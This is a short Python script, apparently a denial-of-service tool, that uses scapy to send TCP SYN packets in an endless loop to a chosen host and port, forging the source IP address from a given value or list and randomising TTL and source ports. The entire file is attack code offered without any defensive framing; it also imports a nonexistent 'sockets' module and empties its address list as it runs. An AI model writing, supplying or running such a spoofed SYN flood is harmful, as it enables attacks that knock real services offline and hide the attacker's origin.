#!/usr/bin/env python

def sendpacket(Ip_range, destination, targetport, silva):
    from scapy.all import IP, TCP
    import random
    import sockets
    if type(Ip_range) != list:
       while 0 == 0:
             silva.send(bytes(IP(dst = str(destination), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
             print 'package sent'       
    else: 
       while 0 == 0:
             source = random.choice(Ip_range)
             silva.send(bytes(IP(dst = str(destination), src = str(source), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
             Ip_range.remove(source)
             print 'package sent'
             
